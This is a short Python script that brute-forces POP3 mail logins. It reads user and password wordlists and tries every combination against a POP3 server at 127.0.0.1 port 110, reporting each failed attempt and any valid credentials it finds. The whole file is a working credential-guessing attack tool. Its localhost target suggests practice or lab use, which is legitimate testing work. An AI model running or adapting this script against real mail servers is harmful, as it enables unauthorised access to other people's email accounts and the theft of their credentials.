import poplib, csv

users_path = input("Insert the wordlist's path for the user: ")
passwords_path = input("Insert the wordlist's path for the password: ")
validCreds = False

with open(users_path, newline='') as users_file, open(passwords_path, newline='') as passwd_file:
    users_reader = csv.reader(users_file)
    passwords_reader = csv.reader(passwd_file)
    passwords = [row[0] for row in passwords_reader if row]

    for user_row in users_reader:
        if user_row:
            user = user_row[0]
            for passwd in passwords:
                try:
                    POP3 = poplib.POP3("127.0.0.1", 110)
                    POP3.user(user)
                    POP3.pass_(passwd)
                except:
                    print(f"[ATTEMPT] Authentication failed for {user}:{passwd}")
                else:
                    print(f"[SUCCESS] Valid credentials [{user}:{passwd}]")
                    validCreds = True
                    break
if not validCreds:
    print("[FAILED] No valid credentials found!")
                
